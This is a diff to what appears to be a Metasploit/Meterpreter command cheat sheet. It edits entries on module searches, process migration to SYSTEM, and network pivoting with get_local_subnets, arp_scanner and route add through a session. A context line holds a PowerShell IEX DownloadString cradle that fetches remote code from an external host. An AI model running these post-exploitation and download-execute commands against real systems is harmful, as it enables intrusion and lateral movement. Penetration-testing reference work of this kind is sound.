@@ -51,6 +51,7 @@ search ms17                                   Show all Microsoft exploits releas
 grep <string> search <type>
 grep php search payloads                      Search payloads then grep for php
 grep linux show post                          Search post exploitation modules then grep for linux
+grep -v gather search post/windows
 ------------------------------------------------------------------------------------------------------
 
 # Basic usage
@@ -182,9 +183,10 @@ Many options allow specifying session ranges using commas and dashes. For exampl
 
 getuid                                        Get the user that the server is running as
 sysinfo                                       Gets information about the remote system, such as OS
-ps                                            Search for a process running as NT AUTHORITY\SYSTEM or root (*nix)
-migrate <PID>                                 Migrate to a process running as NT AUTHORITY\SYSTEM or root (*nix)
+ps                                            Search for a process running as NT AUTHORITY\SYSTEM (or root on *nix)
+migrate <PID>                                 Migrate to a process running as NT AUTHORITY\SYSTEM (or root on *nix)
 ipconfig                                      Show the target IP
+route                                         Look for an additional subnet
 ------------------------------------------------------------------------------------------------------
 
 # Escalate privileges - Windows
@@ -414,17 +416,10 @@ powershell -command "IEX (New-Object Net.WebClient).DownloadString('http://hacke
 
 run get_local_subnets                         Get the local subnets
 ipconfig                                      Look for dual-homed connections
-192.168.0.10
-255.255.255.0
- 
-10.0.0.5
-255.255.255.0
+                                              192.168.0.10
+                                              10.0.0.5
 
-run arp_scanner -r 10.10.10.1/24
-10.0.0.1
-10.0.0.2
-10.0.0.5
-10.0.0.20
+run arp_scanner -r 10.10.0.1/24
 
 meterpreter > background
 route add 10.0.0.1/24 x                       Where x is the meterpreter session ID
